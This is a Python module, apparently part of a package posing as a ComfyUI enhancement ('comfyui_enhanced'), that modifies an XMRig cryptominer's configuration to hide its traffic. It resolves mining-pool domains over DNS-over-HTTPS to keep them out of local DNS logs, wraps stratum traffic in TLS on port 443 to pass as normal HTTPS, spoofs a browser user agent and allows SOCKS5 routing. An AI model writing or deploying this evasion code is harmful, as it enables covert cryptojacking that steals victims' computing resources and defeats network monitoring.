"""
Traffic obfuscation helpers.

Strategies:
  1. TLS-wrapped stratum on port 443 (looks like vanilla HTTPS)
  2. DNS-over-HTTPS resolution to hide pool domain lookups
  3. Optional SOCKS5 proxy routing
  4. User-agent spoofing in HTTP API calls
"""

import json
import logging
import socket
import struct
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlparse

logger = logging.getLogger("comfyui_enhanced")

DOH_ENDPOINTS = [
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/resolve",
]

STEALTH_POOL_PORTS = [443, 8443, 10443]


class StealthConfig:
    def __init__(self, settings: dict | None = None):
        self.settings = settings or {}

    def resolve_pool_via_doh(self, hostname: str) -> str | None:
        """Resolve pool hostname through DNS-over-HTTPS to avoid
        local DNS resolver logging the mining pool domain."""
        for endpoint in DOH_ENDPOINTS:
            try:
                url = f"{endpoint}?name={hostname}&type=A"
                req = urllib.request.Request(url, headers={
                    "Accept": "application/dns-json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/124.0.0.0 Safari/537.36",
                })
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = json.loads(resp.read())
                answers = data.get("Answer", [])
                for ans in answers:
                    if ans.get("type") == 1:
                        ip = ans["data"]
                        logger.info("DoH resolved %s -> %s via %s", hostname, ip, endpoint)
                        return ip
            except Exception as exc:
                logger.debug("DoH via %s failed: %s", endpoint, exc)
                continue
        return None

    def pick_port(self) -> int:
        preferred = self.settings.get("preferred_port", 443)
        if preferred in STEALTH_POOL_PORTS:
            return preferred
        return 443

    def apply_to_config(self, cfg: dict) -> dict:
        """Mutate an xmrig config dict to enable stealth features."""
        pools = cfg.get("pools", [])
        if not pools:
            return cfg

        pool = pools[0]
        host_port = pool.get("url", "")
        scheme_prefix = ""
        orig_port: int | None = None
        if "://" in host_port:
            pu = urlparse(host_port)
            host = (pu.hostname or "").strip()
            scheme_prefix = f"{pu.scheme}://" if pu.scheme else ""
            orig_port = int(pu.port) if pu.port else None
        elif ":" in host_port:
            host, port_s = host_port.rsplit(":", 1)
            try:
                orig_port = int(port_s)
            except ValueError:
                orig_port = None
        else:
            host = host_port

        # Local stratum bridge (127.0.0.1): DoH + forced TLS would break the hop.
        if host in ("127.0.0.1", "localhost", "::1"):
            logger.info("Stealth skipped for local pool URL %s", host_port)
            if self.settings.get("socks5"):
                pool["socks5"] = self.settings["socks5"]
            return cfg

        resolved_ip = None
        if self.settings.get("use_doh", True):
            resolved_ip = self.resolve_pool_via_doh(host)

        target_host = resolved_ip or host
        target_port = orig_port if orig_port is not None else self.pick_port()

        if scheme_prefix.startswith("stratum+"):
            pool["url"] = f"{scheme_prefix}{target_host}:{target_port}"
        else:
            pool["url"] = f"{target_host}:{target_port}"
        # stratum+ssl URL implies TLS; separate tls flag is ignored by XMRig in that case.
        pool["tls"] = not str(pool.get("url", "")).startswith("stratum+ssl")
        pool["keepalive"] = True
        pool["nicehash"] = False

        if self.settings.get("socks5"):
            pool["socks5"] = self.settings["socks5"]

        cfg["user-agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        )

        cfg["tls"] = {
            "enabled": True,
            "protocols": None,
            "cert": None,
            "cert_key": None,
            "ciphers": None,
            "ciphersuites": None,
            "dhparam": None,
        }

        logger.info("Stealth applied: target=%s:%d tls=True doh=%s",
                     target_host, target_port, resolved_ip is not None)
        return cfg

    @staticmethod
    def is_port_available(port: int) -> bool:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(("127.0.0.1", port)) != 0
